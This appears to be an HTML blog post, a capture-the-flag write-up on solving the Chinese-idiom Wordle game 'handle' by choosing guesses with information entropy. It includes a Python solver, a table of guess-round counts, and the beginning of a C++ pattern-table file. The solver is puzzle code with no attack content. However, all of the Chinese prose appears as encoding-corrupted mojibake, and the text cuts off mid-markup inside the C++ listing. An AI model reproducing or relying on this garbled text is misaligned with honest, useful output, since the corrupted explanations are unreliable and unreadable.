        <content type="html"><![CDATA[<p>è™ç¬¦ç­¾åˆ°é¢˜handleï¼Œè¿å®˜æ–¹wpéƒ½å«ä½ ç›´æ¥éšä¾¿é€‰ä¸€ä¸ªçœ‹èµ·æ¥è¿‡å¾—å»çš„å°±è¡Œï¼Œç¡®å®æ˜¯handleé‡Œå¯¹äºå¼€å¤´çš„æˆè¯­åŸºæœ¬æ²¡å•¥è®²ç©¶ï¼Œä½†æ˜¯åæ­£åšéƒ½åšäº†ä¸å¦‚åšå®Œåšå¥½ï¼Œäºæ˜¯å°±åˆèŠ±äº†äº›æ—¶é—´è·Ÿç€3b1bçš„wordleè§†é¢‘åšäº†ä¸ªè¿™ï¼Œä¸»è¦æ˜¯<b>ä¿¡æ¯è®º</b>çš„åº”ç”¨å’Œå¯¹C++çš„é¡ºä¾¿å®æ“</p><span id="more"></span><h1 id="HandleCrack-ä¿¡æ¯è®º"><a href="#HandleCrack-ä¿¡æ¯è®º" class="headerlink" title="HandleCrack[ä¿¡æ¯è®º]"></a>HandleCrack[ä¿¡æ¯è®º]</h1><p>ä¸ºäº†æ–‡ç« é•¿åº¦å°½é‡çŸ­ç‚¹ï¼ˆæ‡’ï¼‰ï¼Œä»¥ä¸‹æ˜¯æˆ‘ç•¥è¿‡ä½†è¯»è€…åº”è¯¥çŸ¥é“çš„å†…å®¹ï¼š</p><ul><li><a href="https://handle.antfu.me/">handle</a>å’Œwordleçš„è§„åˆ™</li><li>E = âˆ‘ -p_i * log(p_i)</li></ul><p>ï¼ˆç›´æ¥å»çœ‹ä¸€é<a href="www.bilibili.com/video/BV1zZ4y1k7Jw">3b1bè§†é¢‘</a>å¤šå¥½ï¼Œä»¥åŠå¦ä¸€ä¸ª<a href="www.bilibili.com/video/BV1A3411p7Xv">3b1bçš„è¡¥å……è¯´æ˜</a>ï¼‰</p><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>&gt;&gt; é—®ï¼šåŸé¢˜ä¸æ˜¯pyå—æ€ä¹ˆè¦æ‰¯cppï¼Ÿ</p><p>ç­”ï¼šä¸ä¼šä¼˜åŒ–pyæ‰€ä»¥æˆ‘çš„cppè·‘èµ·æ¥åº”è¯¥æ¯”pyå¿«ï¼ˆ?ï¼‰ï¼Œè€Œä¸”cppçš„ä½æ“ä½œå’Œæ‰‹åŠ¨å†…å­˜ç®¡ç†æˆ‘çœ‹ç€è¦æ”¾å¿ƒä¸€ç‚¹ï¼ˆæ‰§å¿µï¼ˆä¸è¦å­¦æˆ‘ï¼ˆå‘œ</p><p>&gt;&gt; é—®ï¼šä¸æ˜¯éšä¾¿é€‰ä¸€ä¸ªå½“å¼€å¤´è¯å°±å¯ä»¥äº†å—ï¼Œä¸ºä»€ä¹ˆè¿˜è¦è´¹è¿™ä¹ˆå¤§åŠ›æ°”æ•´è¿™äº›ï¼Ÿ</p><p>ç­”ï¼šä¸€ï¼Œçœ‹äº†wordleçš„è§†é¢‘è‡ªå·±ä¹Ÿæƒ³å®æ“ä¸€ä¸‹ï¼›äºŒï¼Œåæ­£æ¯”èµ›éƒ½ç»“æŸäº†ä¸å¦‚åšå®Œå–„ç‚¹ï¼›ä¸‰ï¼Œä¸æ±‚å‡ºæ¥æˆ‘ä¼šç¡ä¸ç€è§‰çš„ã€‚æ€»ä¹‹å°±æ˜¯è™½ç„¶ç¡®å®æ ¹æ®æœ€åçš„ç»“æœçœ‹æ¥ï¼Œåªè¦é€‰ä¸€ä¸ªæ¯”è¾ƒæ­£å¸¸çš„æˆè¯­ï¼Œæˆ–è€…å¤šè¯•å‡ ä¸ªå¼€å¤´è¯ï¼Œå°±èƒ½è¾¾åˆ°å¾ˆå¥½çš„æ•ˆæœäº†ï¼Œä½†æ˜¯æˆ‘å°±æ˜¯æƒ³åšä¸€ä¸‹ï¼Œå› ä¸ºæŒºæœ‰è¶£çš„</p><h2 id="é¢˜é¢"><a href="#é¢˜é¢" class="headerlink" title="é¢˜é¢"></a>é¢˜é¢</h2><p>Handleåœ¨4è½®å†…æ‰¾åˆ°ç­”æ¡ˆï¼Œé‡å¤512æ¬¡ï¼Œæ¯æ¬¡çš„é€‰è¯ç”±<code>random.choice()</code>äº§ç”Ÿ</p><p>ç„¶åå°±æ˜¯ä»–è¿™ä¸ªäº¤äº’æœ‰ç‚¹éš¾å—ï¼Œç”±äºä½ è¾“å…¥è¯è¯­åå®ƒè¿”å›çš„æ‹¼éŸ³å¯¹é”™ä¿¡æ¯æ˜¯ä»¥é¢œè‰²æ ‡æ³¨çš„ï¼Œè™½ç„¶å¬ç¾¤é‡Œè¯´å­—èŠ‚æµä¸‹é¢œè‰²å¯ä»¥æ¯”è¾ƒæ–¹ä¾¿çš„è·å–ï¼Œä½†æ˜¯åæ­£åé¢æˆ‘å¤ç°çš„æ—¶å€™æ˜¯æ²¡æœ‰ç®¡è¿™ä¸ªçš„</p><p><a href="https://kyriota.com/html/DLfiles/%E8%99%8E%E7%AC%A6handle.zip">ä¸‹è½½é“¾æ¥(githubæº)</a></p><h2 id="Handleæ‚è°ˆ"><a href="#Handleæ‚è°ˆ" class="headerlink" title="Handleæ‚è°ˆ"></a>Handleæ‚è°ˆ</h2><p>wordleæ˜¯å›ºå®š5ä¸ªå­—æ¯ï¼Œæ¯ä¸ªå­—æ¯æ¡†æœ‰ä¸‰ç§æƒ…å†µï¼Œæ‰€ä»¥ç†è®ºä¸Šæ€»å…±çš„å¯èƒ½æ€§æ˜¯3^5ç§</p><p>handleæ˜¯å›ºå®š4ä¸ªæ‹¼éŸ³ï¼Œæ¯ä¸ªå­—çš„æ‹¼éŸ³åˆ†ä¸ºå£°æ¯ï¼ŒéŸµæ¯ï¼Œå£°è°ƒï¼Œæ‰€ä»¥å¯ä»¥çœ‹ä½œæ˜¯12ä¸ªå­—æ¯çš„wordleï¼Œä¹Ÿæ˜¯æ¯ä¸ªæ‹¼éŸ³æ¡†æœ‰ä¸‰ç§æƒ…å†µï¼Œç†è®ºå¯èƒ½æ€§æœ‰3^12ç§</p><h3 id="ç‰¹æ®ŠéŸµæ¯"><a href="#ç‰¹æ®ŠéŸµæ¯" class="headerlink" title="ç‰¹æ®ŠéŸµæ¯"></a>ç‰¹æ®ŠéŸµæ¯</h3><p>ä½†æ˜¯ä¸­æ–‡ä¸­åŒ…å«ç‰¹æ®ŠéŸµæ¯ï¼Œæ¯”å¦‚ enï¼Œerï¼Œei ç­‰ï¼Œä¸€ä¸ªéŸµæ¯å°±æ˜¯ä¸€ä¸ªæ³¨éŸ³çš„å­—ã€‚é‚£æ¯”å¦‚è¿™ä¸€è½®çŒœäº†è¯»éŸ³ä¸º en çš„ä¸€ä¸ªå­—ï¼Œåˆ™ä¸ç®¡æ‰æ²¡çŒœå¯¹ï¼Œéƒ½æŸå¤±äº†ä¸€ä¸ªä½ç½®ä¸Šå£°æ¯çš„ä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯ enï¼Œei è¿™äº›å¯ä»¥å’Œå£°æ¯æ­é…ï¼Œåˆå¯ä»¥è‡ªå·±æ¥çš„ç‰¹æ®ŠéŸµæ¯ï¼Œå¯¹äº er è€Œè¨€ï¼Œç”±äº er ä¸èƒ½å’Œå£°æ¯ç»„åˆï¼Œä¼šæ›´ç‰¹æ®Šä¸€ç‚¹ï¼ˆé¡ºä¾¿ä¸€æï¼Œpyçš„æ‹¼éŸ³åº“å¾—å‡ºçš„æ‹¼éŸ³ä¸çŸ¥ä¸ºä½•å¯¹â€œäº†â€è¿™ä¸ªå­—ä¹Ÿæ²¡æœ‰éŸ³è°ƒï¼Œæ‰€ä»¥æœ‰äº›æ—¶å€™ä¸æ­¢ä¼šåœ¨å£°æ¯ä¸Šä¸ºç©ºï¼Œå£°è°ƒä¹Ÿæœ‰å¯èƒ½ä¸ºç©ºï¼‰</p><p>ä½†æ˜¯æˆ‘å·²ç»ä¸æƒ³æ€è€ƒäº†ï¼Œæ‰€ä»¥æˆ‘å°±æŠŠ er å’Œ enï¼Œei ä¹‹ç±»çš„åŒç­‰å¤„ç†çš„ï¼Œä¹Ÿè®¸æŠŠ er å†å•ç‹¬åˆ†å‡ºæ¥åˆä¼šç¨å¾®ä¸ä¸€æ ·ä¸€ææï¼Œä½†æ˜¯æˆ‘çœŸçš„å·²ç»åœæ­¢æ€è€ƒäº†</p><h3 id="è¯åº“"><a href="#è¯åº“" class="headerlink" title="è¯åº“"></a>è¯åº“</h3><p>å…¶å®æˆ‘å½“æ—¶ä»¥ä¸ºä»–é¢˜ç›®æ²¡ç»™ä»£ç ï¼ŒæŸ¥äº†ä¸€ä¸‹å¸¸ç”¨æˆè¯­è²Œä¼¼ä¹Ÿå°±å‡ åƒä¸ªï¼Œæˆ‘å°±å»ç™¾åº¦æ±‰è¯­æ‰’äº†ä¸€ä¸ªç™¾åº¦çš„æˆè¯­è¯åº“ï¼Œé‚£ä¹Ÿæ‰4000ä¸ªè¯å•Šï¼Œå¥½å®¶ä¼™ç»“æœä»–ç»™çš„é‚£ä¸ªåˆ—è¡¨æœ‰å°†è¿‘ä¸¤ä¸‡å…­åƒä¸ªè¯ï¼ˆï¼Ÿï¼‰ï¼Œçœ‹äº†ä¸€ä¸‹æ˜¯ä»<a href="https://github.com/antfu/handle">è¿™é‡Œé¢</a>æ¬çš„ï¼Œé‡Œé¢ç”šè‡³æœ‰<b>â€œå¯å£å¯ä¹â€</b>ä¹‹ç±»çš„ç‰¹åˆ«å¥‡æ€ªçš„ä¸œè¥¿ï¼Œå“ˆå“ˆ (^ ^)</p><img src="/images/memes/TMDbloodpresure.jpg" height="100" width="100" /><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>è¿™ä¸ªexpé‡Œä¸åŒ…å«å¯¹ä¸Šé¢æåˆ°çš„ç‰¹æ®ŠéŸµæ¯çš„ç‰¹æ®Šå¤„ç†ï¼ŒåŒæ—¶ç›´æ¥ç”¨çš„å‡½æ•°returnçš„ä¿¡æ¯æ¥åé¦ˆçš„ï¼Œè€Œ<strong>ä¸æ˜¯é¢˜ç›®ç¯å¢ƒä¸‹çš„é¢œè‰²ä¿¡æ¯</strong></p><h3 id="åæ§½"><a href="#åæ§½" class="headerlink" title="åæ§½"></a>åæ§½</h3><p>expçš„æ€è·¯å¾ˆç®€å•ï¼Œçš„ç¡®åªéœ€è¦æ¯”è¾ƒéšä¾¿çš„é€‰æ‹©å¼€å±€çš„è¯è¯­å°±å¯ä»¥äº†ï¼Œç”šè‡³ç¬¬ä¸€ä¸ªè¯â€œä¸€ä¸ä¸è¯†â€åœ¨æœ€åç®—å‡ºæ¥çš„ä¿¡æ¯ç†µæ’åé‡Œé¢éƒ½å¾ˆé å‰ï¼Œåªè¦ä¸æ˜¯â€œå¯å£å¯ä¹â€è¿™ç§å¥‡æ€ªçš„è¯ï¼Œå°±å¯ä»¥åœ¨è¿æ°”çš„åŠ æŒä¸‹ç›´æ¥å‡ºflagï¼Œè¯´å®è¯è¿™ä¸ªflagæ˜¯å¿…é¡»è¦è¿æ°”çš„ï¼Œå› ä¸ºå°±ç®—æ˜¯æˆ‘æœ€åç®—å‡ºæ¥çš„ä¿¡æ¯ç†µæœ€é«˜çš„è¯ä»–ä¹Ÿä¸èƒ½ä¿è¯4è½®å‡ºç»“æœï¼Œæˆ‘å¾—åˆ°çš„å¹³å‡è½®æ¬¡å¤§æ¦‚æ˜¯2.62è½®ï¼ˆå’Œé¢˜ç›®æ¡ä»¶ä¸€æ ·éšæœºæŠ½å–æµ‹è¯•512æ¬¡ï¼‰ï¼Œè€Œè¢«æˆ‘ç›®å‡»åˆ°çš„æœ€å¤§è½®æ¬¡æ˜¯6è½®ï¼Œè™½ç„¶æˆ‘å†™çš„è¿™ä¸ªè„šæœ¬ä¼˜åŒ–æ¯”è¾ƒçƒ‚ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸å½±å“æˆ‘è¯´ï¼šè¿™ä¸ªé¢˜ä»–åº”è¯¥çœ‹ä½ åˆ°æœ€åçš„å¹³å‡è½®æ¬¡æ˜¯å¦åˆæ ¼ï¼Œè€Œä¸æ˜¯çœ‹æœ€å¤§è½®æ¬¡ = =</p><p>åœ¨çš„<a href="https://mp.weixin.qq.com/s?__biz=MzU5Njg1NzMyNw==&mid=2247484500&idx=1&sn=35e43e11b29119544045fa7dfd56c10a&chksm=fe5d1cd4c92a95c208c93921a0b8f328cb92daf0630bc8a5ed7eaaafc30500fc44768beb0b6f&mpshare=1&scene=23&srcid=0324Ct2tOV94yqxYEa60Rbey&sharer_sharetime=1648094683578&sharer_shareid=c69a4128c20e54a8749107dca4adf514#rd">å®˜æ–¹wp</a>é‡Œå¯¹ä»–è‡ªå·±çš„expè¡¨ç¤ºï¼š</p><blockquote><p>è¿™ä¸ªè„šæœ¬ä¹Ÿä¸æ˜¯å¿…æˆåŠŸï¼Œä½†æ˜¯ä½“æ„ŸæˆåŠŸç‡éå¸¸é«˜ï¼Œå¹³å‡çŒœè¯æ¬¡æ•° 2.72ï¼Œä¹Ÿè®¸æ¢ä¸ªèµ·å§‹è¯å¯ä»¥æŠŠæœ€å¤§æ¬¡æ•°å‹åˆ° 3</p></blockquote><p>å“¥ä½ å¾—æœ‰æ•°æ®å•Šä¸è¦å‡­æ„Ÿè§‰å•Šï¼Œå‡ºé¢˜äººå¯èƒ½æ˜¯è§‰å¾—ä»–éšä¾¿é€‰äº†ä¸ªè¯å°±å¯ä»¥æŠŠå¹³å‡çŒœè¯æ•°å‹å€’2.72ï¼Œæ‰€ä»¥ä¼˜åŒ–ä¸€ä¸‹åº”è¯¥èƒ½è½»æ¾å‹å¾—å¾ˆä½ï¼Œä½†æ˜¯é—®é¢˜å°±æ˜¯å…¶å®è¿™äº›è¯è¯­çš„ä¿¡æ¯ç†µçš„åˆ†å¸ƒæ€»ä½“æ¥çœ‹éƒ½ç®—æ˜¯æ¯”è¾ƒé«˜çš„äº†ï¼Œæ€»å…±ä¸åˆ°2.6wä¸ªè¯ï¼Œ2.1wä¸ªè¯çš„ä¿¡æ¯ç†µåœ¨10ä»¥ä¸Šï¼Œæœ€é«˜çš„ä¿¡æ¯ç†µä¹Ÿå°±12.8755ï¼Œæ„æ€æ˜¯ä½ éšä¾¿é€‰ä¸­é‚£2.1wä¸ªä¿¡æ¯ç†µåœ¨10ä»¥ä¸Šçš„è¯çš„æ—¶å€™ï¼Œç†è®ºä¸Šå‰©ä¸‹çš„è¯æ•°çš„æœŸæœ›å°±åªæœ‰25.3ä¸ªï¼Œä½†3b1bè®²wordleçš„è§†é¢‘é‡Œæœ‰å¥è¯è¯´å¾—å¥½ï¼Œå°±ï¼Œâ€œæœŸæœ›æ˜¯æœŸæœ›ï¼Œå®é™…æ˜¯å®é™…â€ï¼ˆå¤§æ¦‚æ˜¯è¿™ä¸ªæ„æ€ï¼‰ï¼Œæ‰€ä»¥è¿˜æ˜¯é‚£å¥è¯ï¼Œæœ€å¥½å°±å­˜ä¸€ä¸‹é€‰æ‰‹çš„è½®æ¬¡ä¿¡æ¯ï¼Œæœ€åç®—ä¸€ä¸‹å¹³å‡è½®æ¬¡å¤Ÿä¸å¤Ÿå°</p><p>åœ¨æˆ‘æŠ½çš„512æŠ½é‡Œé¢å¤§æ¦‚æ˜¯è¿™ä¹ˆä¸ªåˆ†å¸ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">çŒœä¸­è½®æ¬¡ -| ä¸€å‘å…¥é­‚ |    2    |    3    |    4    |    5    |    6    |</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">å‘ç”Ÿæ¬¡æ•° -|    1    |   230   |   247   |   32    |    1    |    1    |</span><br></pre></td></tr></table></figure><img src="/images/handle_bar.png"/><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p>æŒºæ— è„‘çš„ï¼Œpyæ°´å¹³æœ‰é™ï¼Œæœ‰äº›åœ°æ–¹ä¸å¤ªä¼˜é›…</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        exp    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">initials, finals, tones = [], [], []</span><br><span class="line"><span class="comment"># é¢„å…ˆå­˜äº†ä¸€ä¸‹æ‹¼éŸ³</span></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> idioms:</span><br><span class="line">    pinyin = get_pinyin(word)</span><br><span class="line">    initials.append(pinyin[<span class="number">0</span>])</span><br><span class="line">    finals.append(pinyin[<span class="number">1</span>])</span><br><span class="line">    tones.append(pinyin[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetWord</span>(<span class="params">words</span>):</span></span><br><span class="line">    <span class="comment"># æ ¹æ® E å¾—å‡ºå½“å‰æœ€ä¼˜è¯</span></span><br><span class="line">    wordLen = <span class="built_in">len</span>(words)</span><br><span class="line">    <span class="keyword">if</span> wordLen &gt; <span class="number">25000</span>: <span class="comment"># å¼€å¤´è¯å›ºå®š</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ç ”ç»é“¸å²&quot;</span></span><br><span class="line">    E = []</span><br><span class="line">    <span class="keyword">for</span> guessIndex <span class="keyword">in</span> <span class="built_in">range</span>(wordLen): <span class="comment"># æ— è„‘éå†ç®— E</span></span><br><span class="line">        partern, count, prob = [], [], []</span><br><span class="line">        <span class="keyword">for</span> ansIndex <span class="keyword">in</span> <span class="built_in">range</span>(wordLen):</span><br><span class="line">            result = []</span><br><span class="line">            result.append(check_part(initials[guessIndex],initials[ansIndex]))</span><br><span class="line">            result.append(check_part(finals[guessIndex],finals[ansIndex]))</span><br><span class="line">            result.append(check_part(tones[guessIndex],tones[ansIndex]))</span><br><span class="line">            findFlag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(partern)):</span><br><span class="line">                <span class="keyword">if</span> partern[i] == result:</span><br><span class="line">                    count[i] += <span class="number">1</span></span><br><span class="line">                    findFlag = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> findFlag:</span><br><span class="line">                partern.append(result)</span><br><span class="line">                count.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(partern)):</span><br><span class="line">            p = count[i] / wordLen</span><br><span class="line">            prob.append(-p * log2(p))</span><br><span class="line">        E.append(<span class="built_in">sum</span>(prob))</span><br><span class="line">        print(<span class="string">&quot;\r&gt;&gt; E: &quot;</span> + <span class="built_in">str</span>(guessIndex), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;\n&gt;&gt; max E: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">max</span>(E)))</span><br><span class="line">    <span class="keyword">return</span> words[argmax(E)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DeleteWord</span>(<span class="params">words, result, guess</span>):</span></span><br><span class="line">    <span class="comment"># æŠŠä¸ç¬¦åˆåé¦ˆ partern çš„è¯åˆ æ‰</span></span><br><span class="line">    certain = []</span><br><span class="line">    uncertain = []</span><br><span class="line">    wrong = []</span><br><span class="line">    pinyin = get_pinyin(guess)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> result[i][j] == status.OK:</span><br><span class="line">                certain.append([pinyin[i][j],(i,j)])</span><br><span class="line">            <span class="keyword">elif</span> result[i][j] == status.MISS:</span><br><span class="line">                uncertain.append([pinyin[i][j],(i,j)])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                wrong.append([pinyin[i][j],(i,j)])</span><br><span class="line">    newWords = []</span><br><span class="line">    <span class="keyword">for</span> wordIndex <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(words)):</span><br><span class="line">        pinyin = get_pinyin(words[wordIndex])</span><br><span class="line">        flag = <span class="literal">True</span> <span class="keyword">and</span> words[wordIndex] != guess</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> certain:</span><br><span class="line">            <span class="keyword">if</span> pinyin[i[<span class="number">1</span>][<span class="number">0</span>]][i[<span class="number">1</span>][<span class="number">1</span>]] != i[<span class="number">0</span>]:</span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> uncertain:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> pinyin[i[<span class="number">1</span>][<span class="number">0</span>]] <span class="keyword">or</span> i[<span class="number">0</span>] == pinyin[i[<span class="number">1</span>][<span class="number">0</span>]][i[<span class="number">1</span>][<span class="number">1</span>]]:</span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> wrong:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] <span class="keyword">in</span> pinyin[i[<span class="number">1</span>][<span class="number">0</span>]]:</span><br><span class="line">                wrongCnt = pinyin[i[<span class="number">1</span>][<span class="number">0</span>]].count(i[<span class="number">0</span>])</span><br><span class="line">                certainCnt, uncertainCnt = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> certain:</span><br><span class="line">                    certainCnt += j.count(i[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> uncertain:</span><br><span class="line">                    uncertainCnt += j.count(i[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">if</span> wrongCnt &lt;= certainCnt + uncertainCnt:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        newWords.append(words[wordIndex])</span><br><span class="line">    <span class="keyword">return</span> newWords</span><br></pre></td></tr></table></figure>    </div></div><h2 id="æœ€ä¼˜å¼€å¤´"><a href="#æœ€ä¼˜å¼€å¤´" class="headerlink" title="æœ€ä¼˜å¼€å¤´"></a>æœ€ä¼˜å¼€å¤´</h2><p>æˆ‘å…¶å®ä¹‹å‰æƒ³è¿‡èƒ½ä¸èƒ½ç›´æ¥æ„é€ ä¸€ä¸ªæœ€ä¼˜å¼€å¤´ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆæ€è·¯ï¼Œå°±å†³å®šä»ä»–ç»™å‡ºçš„2.6wä¸ªè¯é‡Œé¢æ‰¾ä¸€ä¸ªæœ€ä¼˜å¼€å¤´</p><p>ç”±äºæ–‡ç« ä¸€å¼€å¤´è¯´çš„ä¼˜åŒ–é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘å°±<code>py2cpp()</code>äº†</p><h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><p>é¦–å…ˆæˆ‘æŠŠæ‰€æœ‰è¯çš„æ‹¼éŸ³éƒ½é€šè¿‡pyçš„æ‹¼éŸ³åº“å¯¼å‡ºåˆ°äº†ç¡¬ç›˜ï¼Œæ— éŸµæ¯æ— å£°è°ƒçš„åœ°æ–¹ç”¨â€œ#â€è¿›è¡Œäº†å ä½ï¼Œç„¶åä¸ºäº†ä¹‹åä¸å†é‡å¤ç»Ÿè®¡ä¸€ä¸ªè¯å¦ä¸€ä¸ªè¯æ¯”è¾ƒå¾—å‡ºçš„patternï¼Œæˆ‘æŠŠæ‰€æœ‰parternå¯¼å‡ºï¼Œè¿™æ ·ä¹‹åæŸ¥è¡¨å°±å®Œäº‹äº†</p><p>è¿™ä¸€å—å€¼å¾—æ³¨æ„çš„åº”è¯¥ä¹Ÿå°±æ˜¯patternçš„<strong>å­˜å‚¨æ ¼å¼</strong>äº†</p><p>å› ä¸ºæ¯ä¸€ä¸ªæ‹¼éŸ³ä½æœ‰4ç§æƒ…å†µï¼šç¡®å®šå­˜åœ¨ä¸”ä½ç½®æ­£ç¡®ï¼Œç¡®å®šå­˜åœ¨ä½†ä½ç½®é”™è¯¯ï¼Œç¡®å®šä¸å­˜åœ¨ï¼Œä¸ç¡®å®šæ˜¯å¦å­˜åœ¨ï¼ˆç‰¹æ®ŠéŸµæ¯ï¼‰ï¼›è€Œæ€»å…±4ä¸ªæ±‰å­—ï¼Œæ¯ä¸ªæ±‰å­—3ä¸ªæ‹¼éŸ³ä½ï¼Œç”±äºçŠ¶æ€å…±4ç§ï¼Œä¸¤ä½å°±èƒ½è¡¨ç¤ºå®Œï¼ˆ00ï¼Œ01ï¼Œ10ï¼Œ11ï¼‰ï¼Œæ€»å…±éœ€è¦<code>4 * 3 * 2 = 24(bit)</code>ï¼Œåˆšå¥½3å­—èŠ‚ï¼Œæ‰€ä»¥ç”¨3ä¸ª<code>char</code>å°±å¯ä»¥å¡ä¸‹1ä¸ªpatternï¼Œè¿™éƒ¨åˆ†è¯¦è§ä¸‹æ–¹æŠ˜å ä»£ç ä¸­çš„<code>CalPattern()</code></p><div class='spoiler collapsed'>    <div class='spoiler-title'>        crackGen.cpp    </div>    <div class='spoiler-content'>        <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 